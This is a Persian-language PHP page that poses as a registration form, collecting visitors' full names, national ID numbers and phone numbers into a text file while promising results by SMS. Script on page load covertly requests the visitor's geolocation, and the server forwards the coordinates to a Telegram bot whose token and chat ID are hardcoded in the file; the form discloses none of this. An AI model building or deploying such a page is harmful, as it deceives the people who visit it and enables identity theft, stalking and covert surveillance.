<?php
// --- ذخیره اطلاعات فرم در فایل متنی ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['fullname'])) {
    $fullname = htmlspecialchars($_POST['fullname']);
    $national_id = htmlspecialchars($_POST['national_id']);
    $phone = htmlspecialchars($_POST['phone']);

    $data = "نام و نام خانوادگی: $fullname\nکد ملی: $national_id\nشماره تماس: $phone\n---\n";
    file_put_contents("data.txt", $data, FILE_APPEND | LOCK_EX);
    
    echo "<div style='text-align:center; margin-top:50px; font-family:Tahoma; font-size:18px; color:green;'>
            اطلاعات شما ثبت شد.<br>به‌زودی نتیجه از طریق پیامک به اطلاع شما می‌رسد.
          </div>";
    exit;
}

// --- دریافت موقعیت مکانی و ارسال به تلگرام ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && strpos($_SERVER['CONTENT_TYPE'], 'application/json') !== false) {
    $input = file_get_contents("php://input");
    $data = json_decode($input, true);

    if (isset($data['latitude']) && isset($data['longitude'])) {
        $latitude = $data['latitude'];
        $longitude = $data['longitude'];

        // 🔐 توکن و chat_id ربات تلگرام خود را اینجا وارد کنید
        $telegram_token = '7926937226:AAFcIfZulEjhnXx7gQpnm712eE1-LvKoT_o';
        $chat_id = '-1002570608346';

        $telegram_url = "https://api.telegram.org/bot$telegram_token/sendLocation?chat_id=$chat_id&latitude=$latitude&longitude=$longitude";
        file_get_contents($telegram_url);
    }

    exit;
}
?>

<!-- 🌐 فرم گرافیکی برای ورود اطلاعات -->
<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>فرم ثبت اطلاعات</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      background: #f0f2f5;
      font-family: 'Tahoma', sans-serif;
      direction: rtl;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .form-container {
      background: #ffffff;
      padding: 30px 40px;
      border-radius: 10px;
      box-shadow: 0px 4px 15px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
    }

    .form-container h2 {
      text-align: center;
      color: #333;
      margin-bottom: 25px;
    }

    input[type="text"],
    input[type="tel"] {
      width: 100%;
      padding: 10px 12px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
    }

    button {
      width: 100%;
      background-color: #4CAF50;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>

  <div class="form-container">
    <h2>فرم ثبت اطلاعات</h2>
    <form method="post" action="">
      <input type="text" name="fullname" placeholder="نام و نام خانوادگی" required>
      <input type="text" name="national_id" placeholder="کد ملی" required maxlength="10">
      <input type="tel" name="phone" placeholder="شماره تماس" required pattern="09[0-9]{9}">
      <button type="submit">ثبت اطلاعات</button>
    </form>
  </div>

  <script>
    // دریافت موقعیت مکانی و ارسال در پس‌زمینه
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(function(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;

        fetch(window.location.href, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            latitude: lat,
            longitude: lon
          })
        });
      });
    }
  </script>

</body>
</html>
